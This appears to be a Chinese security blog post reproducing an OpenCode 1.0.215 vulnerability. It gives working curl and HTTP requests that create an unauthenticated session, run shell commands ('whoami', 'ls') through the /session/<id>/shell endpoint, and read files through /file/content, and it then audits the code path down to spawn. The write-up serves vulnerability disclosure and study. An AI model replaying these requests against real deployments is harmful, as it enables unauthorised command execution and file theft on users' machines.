---
title: "OpenCode漏洞复现(CVE-2026-22812)"
author: "bx"
description: "OpenCode 1.0.215版本RCE与任意文件读取漏洞深度分析,包含完整的漏洞复现步骤、代码审计细节以及安全防护建议。"
pubDatetime: 2026-01-17
tags:
  - "OpenCode"
  - "RCE"
  - "任意文件读取"
  - "漏洞复现"
  - "安全分析"
draft: false
slug: "opencode-vulnerability-analysis"
---
<meta name="referrer" content="no-referrer">

# OpenCode漏洞复现(GHSA-vxw4-wv6m-9hhh)

最近火爆的OpenCode，就是那个开源的Claude Code替代品，最近爆出了一个新的CVE漏洞。

## 漏洞概述

**漏洞编号**: GHSA-vxw4-wv6m-9hhh  
**影响版本**: OpenCode 1.0.215及以下  
**漏洞类型**: 远程命令执行(RCE) + 任意文件读取  
**危害等级**: 严重  

**官方安全公告**: [https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh)

## 环境搭建

我们这里采用1.0.215版本进行漏洞复现:

```bash
# 初始化项目
npm init -y

# 安装漏洞版本
npm i opencode-ai@1.0.215

# 启动服务
node_modules/.bin/opencode
```

不得不说,opencode的UI确实很好看 👍

![OpenCode UI](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YThiYmU4NDc1NzU3MTI4YWE2YWJjMDM1ZjZkYThlM2ZfZVBiOEQ0Uk9RSU5yNlBycmFlRzgzellnN0tCQXdyREhfVG9rZW46TzNkMGI2SU1Lb1NqdXd4QjFIRWNkQVp6bnZ4XzE3Njg1ODI0MTk6MTc2ODU4NjAxOV9WNA)

## 漏洞复现

### 1. RCE (远程命令执行)

#### 步骤1: 获取会话ID

首先通过无鉴权的接口创建会话:

```bash
curl -s -X POST http://127.0.0.1:4096/session -H "Content-Type: application/json" -d "{}"
```

**响应结果**:
```json
{
  "id":"ses_4386ff31fffeP7CTCc2oDn2mwu",
  "version":"1.0.215",
  "projectID":"global",
  "directory":"C:\\Users\\bx336\\Documents\\skills\\cve",
  "title":"New session - 2026-01-16T16:07:45.120Z",
  "time":{
    "created":1768579665120,
    "updated":1768579665120
  }
}
```

#### 步骤2: 检查CORS配置

```bash
curl -I -X OPTIONS http://127.0.0.1:4096/session
```

**响应头**:
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE,PATCH
Date: Fri, 16 Jan 2026 16:08:30 GMT
Content-Length: 0
```

可以看到 `Access-Control-Allow-Origin: *`,允许任意源访问,这为攻击提供了便利。

#### 步骤3: 执行任意命令

使用获取到的会话ID执行系统命令:

```http
POST /session/ses_4386ff31fffeP7CTCc2oDn2mwu/shell HTTP/1.1
Host: 127.0.0.1:4096
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/json
Content-Length: 35
Connection: close

{"agent":"build","command":"whoami"}
```

![命令执行结果](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ODM4NDkxZmU0M2EyMDQ3MDZmOTEzNmJlNmUzYmQzNjJfeVVxTXpiSnlKNTc1SEd2T0I3T3VjTTJhSjJwTzRwN0hfVG9rZW46VHZuRWJvQ0Rxb1dBVll4N1FRYWMzZVRHblN2XzE3Njg1ODI0MjA6MTc2ODU4NjAyMF9WNA)

**列出目录**:
```json
{"agent":"build","command":"ls"}
```

![目录列表](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MmEwNDA2ZjBkMDBjOTdhMTc0ZTdlZWZlNDMwYjY4NTVfdTFkdXNkbFhNN0Z4YzNuMDllMEUzWGFXVmF4T0tnb0NfVG9rZW46TXRqUmJib0Q3b3J5RG14MERvOWM3aVZ0bnNjXzE3Njg1ODI0MjA6MTc2ODU4NjAyMF9WNA)

### 2. 任意文件读取

OpenCode还存在任意文件读取漏洞,攻击者可以读取服务器上的任意文件:

```http
GET /file/content?path=package.json HTTP/1.1
Host: 127.0.0.1:4096
User-Agent: curl/7.88.1
Accept: */*
Connection: close
```

**响应结果**:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Fri, 16 Jan 2026 16:21:53 GMT
Content-Length: 95

{"type":"text","content":"{\n  \"dependencies\": {\n    \"opencode-ai\": \"^1.0.215\"\n  }\n}"}
```

## 代码审计分析

纵观整个代码,核心问题就是**没有对用户输入进行任何限制和处理**。

### RCE 漏洞链路分析

| 环节 | 代码位置 | 说明 |
|------|----------|------|
| 路由入口 | `packages/opencode/src/server/server.ts:1407` | `/session/:sessionID/shell` 仅参数校验,**无鉴权中间件** |
| 调用链 | `packages/opencode/src/server/server.ts:1434` | 直接调用 `SessionPrompt.shell` |
| 命令输入 | `packages/opencode/src/session/prompt.ts:1046` | `ShellInput.command` 定义为 `string` |
| 进程启动 | `packages/opencode/src/session/prompt.ts:1181` | 直接使用 `spawn(shell, args, ...)` 执行命令 |

### 1. 路由入口(未鉴权)

**文件**: `packages/opencode/src/server/server.ts:1407`

```typescript
.post(
  "/session/:sessionID/shell",
  describeRoute({ summary: "Run shell command" }),
  validator("param", z.object({ sessionID: z.string() })),
  validator("json", SessionPrompt.ShellInput.omit({ sessionID: true })),
  async (c) => {
    const sessionID = c.req.valid("param").sessionID
    const body = c.req.valid("json")
    const msg = await SessionPrompt.shell({ ...body, sessionID })
    return c.json(msg)
  },
)
```

**问题分析**:
- ❌ 没有任何身份验证机制
- ❌ 没有访问控制检查
- ❌ 直接接收并处理用户输入

### 2. 命令输入定义

**文件**: `packages/opencode/src/session/prompt.ts:1046`

```typescript
export const ShellInput = z.object({
  sessionID: Identifier.schema("session"),
  agent: z.string(),
  model: z.object({ providerID: z.string(), modelID: z.string() }).optional(),
  command: z.string(),
})
```

**问题分析**:
- 使用 `zod` 库定义了 `ShellInput` 的结构
- `command: z.string()` **仅保证输入是字符串**
-  **没有对字符串内容进行任何过滤或验证**

### 3. 命令执行

**文件**: `packages/opencode/src/session/prompt.ts:1181`

```typescript
const matchingInvocation = invocations[shellName] ?? invocations[""]
const args = matchingInvocation?.args

const proc = spawn(shell, args, {
  cwd: Instance.directory,
  detached: process.platform !== "win32",
  stdio: ["ignore", "pipe", "pipe"],
  env: { ...process.env, TERM: "dumb" },
})
```

**问题分析**:
- 代码使用 Node.js 的 `child_process.spawn` 启动进程
- 命令在 `Instance.directory` 目录下运行
-  **用户输入的命令直接被执行,没有任何安全检查**
-  **继承了父进程的环境变量**


---

**参考资料**:
- [OpenCode Security Advisory GHSA-vxw4-wv6m-9hhh](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
